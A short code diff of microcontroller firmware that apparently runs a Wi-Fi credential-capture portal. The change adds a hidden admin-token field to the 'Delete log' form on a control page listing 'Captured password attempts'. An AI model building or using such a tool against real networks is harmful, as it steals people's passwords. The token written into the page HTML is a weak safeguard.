@@ -57,8 +57,6 @@ uint32_t bootMillis = 0;
 unsigned long upNow = 0;
 const uint32_t LOG_TTL_SEC = 24UL * 60 * 60; // entries live 24h of active uptime
 
-
-
 uint32_t effNowSec() {
   return totalUptimeSec + (millis() - bootMillis) / 1000;
 }
@@ -367,7 +365,7 @@ String controlPage() {
 
   if (_log != "") {
     html += "</br><h3>Captured password attempts:</h3><ul style='text-align:left;list-style:disc;padding-left:1.5em;'>" + _log + "</ul>";
-    html += "<form method='post' action='/clear'><button style='background-color:#ffcccc'>Delete log</button></form>";
+    html += "<form method='post' action='/clear'><input type='hidden' name='token' value='" + String(ADMIN_TOKEN) + "'><button style='background-color:#ffcccc'>Delete log</button></form>";
   }
 
   html += "</div></body></html>";
